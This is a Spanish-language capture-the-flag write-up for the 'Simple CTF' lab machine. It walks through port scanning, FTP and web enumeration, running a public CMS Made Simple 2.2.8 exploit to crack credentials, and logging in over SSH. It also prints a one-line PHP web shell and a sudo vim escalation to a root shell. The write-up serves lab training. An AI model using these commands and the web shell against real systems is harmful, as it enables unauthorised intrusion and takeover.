# Simple CTF

### Objetivo

- IP objetivo: `10.67.138.41`

### Reconocimiento

Se realizó un escaneo completo de puertos y detección de servicios con Nmap:

```bash
nmap -T5 -sS -sCV -p- --stats-every=5s -Pn 10.67.138.41
```

![](image.png)

Con base en el resultado, se identificaron los servicios **FTP**, **HTTP** y **SSH**. Además:

- Acceso **anónimo** habilitado en FTP.
- Presencia de `robots.txt` en el servicio HTTP.

A continuación, se priorizó la enumeración del servicio FTP.

### Enumeración FTP

Se enumeró el contenido disponible con acceso anónimo.

![](image%201.png)

El archivo encontrado contenía la siguiente pista:

![](image%202.png)

> “Maldición, hombre… eres el peor desarrollador que he visto. Le pusiste la misma contraseña al usuario del sistema, y además es tan débil… la crackeé en segundos. Dios… qué desastre.”
> 

Este mensaje sugiere que **la contraseña coincide con el nombre de usuario**. Por tanto, el siguiente objetivo es identificar un usuario válido para autenticación en el panel web o por SSH.

### Enumeración HTTP

Se continuó con la enumeración del servicio web utilizando `nikto`, `whatweb` y `gobuster`.

```bash
nikto -h http://10.67.138.41/
```

![](image%203.png)

```bash
whatweb http://10.67.138.41/
```

![](image%204.png)

```bash
gobuster dir -u http://10.67.138.41/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![](image%205.png)

Revisión de código fuente (sin hallazgos relevantes):

![](image%206.png)

Los hallazgos relevantes fueron `robots.txt` y el directorio `/simple`. Al acceder a dichas rutas se observó lo siguiente:

![](image%207.png)

Se identificó un CMS y se obtuvo un posible usuario, además de la versión (**CMS Made Simple 2.2.8**):

![](image%208.png)

Se intentó autenticación con el usuario encontrado, pero no fue válido para el panel de administración:

![](image%209.png)

De igual manera, se realizaron intentos por SSH sin éxito en esta etapa:

![](image%2010.png)

### Búsqueda de exploit

Se buscaron exploits públicos para la versión detectada:

```bash
searchsploit "CMS Made Simple" 2.2.8
```

![](image%2011.png)

A partir de los resultados, se seleccionó una vulnerabilidad aplicable para recuperar credenciales y acceder al panel de administración:

![](image%2012.png)

El exploit incluye ejemplos de uso y variables a utilizar:

![](image%2013.png)

Se ejecutó el exploit con la sintaxis indicada:

```bash
python2 46635.py -u http://10.67.138.41/simple --crack -w /usr/share/wordlists/rockyou.txt
```

![](image%2014.png)

Resultado del crack:

![](image%2015.png)

Con estas credenciales fue posible iniciar sesión:

- `mitch` → `secret`

![](image%2016.png)

![](image%2017.png)

### Intento de web shell (no viable)

Se intentó crear una *web shell* en el CMS, añadiendo una sección que interpretara código PHP:

![](image%2018.png)

Como buena práctica, se utilizó un nombre tipo hash para reducir el acceso de terceros al *web shell*:

![](image%2019.png)

Se subió el archivo con el payload:

![](image%2020.png)

```php
<?php system($_GET['cmd']); ?>
```

En este caso, el CMS no aceptaba archivos con extensión `.php`. Antes de intentar técnicas alternativas, se validaron las credenciales recuperadas sobre SSH.

### Acceso inicial (SSH)

![](image%2021.png)

```bash
ssh mitch@10.67.138.41 -p 2222
```

```bash
/bin/bash
```

![](image%2022.png)

### Enumeración local

Enumeración de directorios y recursos locales:

![](image%2023.png)

### Escalada de privilegios

Se revisaron los permisos sudo del usuario:

![](image%2024.png)

El permiso indica que se puede ejecutar `vim` como **root**. Para obtener una shell privilegiada:

```bash
sudo vim -c ':!/bin/bash'
```

![](image%2025.png)

### Flags y finalización

Con privilegios de root se obtuvieron las flags requeridas:

![](image%2026.png)

Se registraron las respuestas solicitadas por la plataforma:

![](image%2027.png)

![](image%2028.png)

Reto finalizado:

![](image%2029.png)